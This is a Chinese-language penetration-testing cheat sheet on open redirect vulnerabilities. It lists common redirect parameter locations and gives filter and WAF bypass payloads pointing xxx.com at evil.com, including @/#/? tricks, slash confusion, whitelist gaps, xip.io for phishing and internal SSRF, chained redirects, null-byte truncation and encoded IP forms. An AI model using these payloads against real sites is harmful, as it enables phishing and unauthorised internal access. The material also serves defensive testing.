# URL跳转漏洞

URL跳转漏洞，是指服务端未对传入的跳转URL变量进行检查和控制，导致诱导用户跳转到恶意网站，由于是从可信站点跳转出去，用户会比较信任

## 场景

(1)登录\退出\授权认证

(2)业务完成处(注册\找回密码\充值\绑定银行卡\某业务办理\404跳转)

(3)用户交互处(评论\问卷\分享\收藏点击站内链接或其他用户)

(4)漏洞构造漏洞 (任意上传后的html，引用其跳转)

(5)跨站点认证、授权后，会跳转

(6)浏览器或页面的返回，基于referer，可以尝试修改

(7)登录处登出

举例

    登录：http://www.xxx.com/login/?url=http://www.evil.com
    
尝试把 login 改为 logout

    退出：http://www.xxx.com/logout/?url=http://www.evil.com
    
(8) 跳转目录

举例

    https://www.xxx.com/?redirect=/user/info.php
    
修改为

    https://www.xxx.com/?redirect=@www.evil.com
    
这种情况通常@也可以跳转，大胆的去尝试

(9)POST参数中的URL跳转

举例：

当你上传了图片后点击下一步抓包，如果过滤不严，你会

看到图片的完整地址包含在POST参数里，你就可以直接修改这个地址为任意URL，然后到达下一步。

由于你刚刚修改了图片地址，这里是没有显示出来的，图像会是一个小XX。

当点击图片右键选择查看图像时，就会触发URL跳转问题，其实这个也可以利用来进行钓鱼

## WAF绕过

### 利用? # @

原理：输入`http://username:password@somewhere.foo`会进入到somewhere.foo网址里

举例

    ?url=http://xxx.com@evil.com
    
    ?url=http://evil.com#xxx.com
    
    ?url=http://evil.com?xxx.com
    
### 反斜杠和正斜杠

举例

    ?url=http://evil.com/xxx.com
    
    ?url=http://evil.com\xxx.com
    
    ?url=http://evil.com\.xxx.com
    
### 白名单缺陷

举例

    ?url=http://xxx.com.evil.com
    
    ?url=http://evilxxx.com
    
    ?url=https://www.xxx.com/redirect.php?url=.evil
    (可能会跳转到evil.com域名,也可能会跳转到www.xxx.com.evil域名)
    
### xip.io

    http://www.xxx.com.<替换IP地址>.xip.io
    
举例

    访问内网（SSRF）
    http://www.xxx.com?url=http://www.127.0.0.1.xip.io
    
    钓鱼
    http://www.xxx.com?url=http://www.qq.com.攻击者ip.xip.io
    
### 多重跳转

举例一

    http://xxx.com?url=http://aa.xxx.com?url=evil.com
    
举例二

假如百度是受信任的

比如一个URL，它是可以直接跳转的，

你在百度里点击你的域名，它会先是一个302跳转，而这个302跳转就是百度下的302跳转，

那么这样就可以绕过可信站点的限制，从而达到跳转到指定URL。

### 插入截断字符

    %00 &0a %0d %07
    
### 跳转到IP、IPV6、IP的十进制、八进制、16进制形式

举例

    baidu IP：183.232.231.172
    
    转16进制：b7.e8.e7.ac (0xb7e8e7ac)
    
    再转8进制：0267.0350.0347.0254 (026772163654)